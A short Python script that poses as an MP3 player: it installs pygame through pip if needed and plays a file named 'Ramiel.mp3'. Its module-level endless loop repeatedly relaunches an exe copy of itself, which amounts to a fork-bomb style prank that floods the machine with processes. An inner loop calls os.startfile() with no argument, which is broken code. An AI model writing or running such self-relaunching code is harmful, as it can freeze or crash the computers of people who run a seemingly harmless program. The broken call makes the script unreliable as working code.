import subprocess
import sys
import os

# Function to install pygame if it's not installed
def install_pygame():
    try:
        import pygame
    except ImportError:
        print("Pygame not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"])
        import pygame  # Retry the import after installation
        print("Pygame installed successfully!")

# Function to play the MP3 file
def play_mp3(file):
    install_pygame()
    import pygame
    
    pygame.mixer.init()

    # Load the MP3 file
    pygame.mixer.music.load(file)

    # Play the MP3 file
    pygame.mixer.music.play()

    while pygame.mixer.music.get_busy():
        pygame.time.Clock().tick(10)
    while True:
        os.startfile()




def main():
    mp3_file = "Ramiel.mp3" 
    play_mp3(mp3_file)

while True:
    os.startfile(__file__[:-2]+"exe")
    main()

